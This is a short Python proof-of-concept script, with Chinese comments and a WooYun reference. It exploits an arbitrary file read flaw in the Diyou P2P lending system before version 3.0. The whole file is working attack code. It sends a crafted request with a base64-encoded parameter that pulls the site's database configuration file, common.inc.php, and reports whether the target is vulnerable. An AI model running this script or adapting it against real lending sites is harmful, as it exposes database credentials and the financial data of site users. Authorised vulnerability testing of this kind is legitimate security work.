#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 帝友P2P借贷系统任意文件读取漏洞
referer: http://www.wooyun.org/bugs/wooyun-2013-033114
author: Lucifer
description: 帝友P2P3.0以前存在任意文件读取漏洞，可读取数据库配置文件
'''
import sys
import requests
import warnings
def run(url):
        result = ['帝友P2P借贷系统任意文件读取漏洞', '', '']
        payload = "/index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21tb24uaW5jLnBocA=="
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"common.inc.php" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
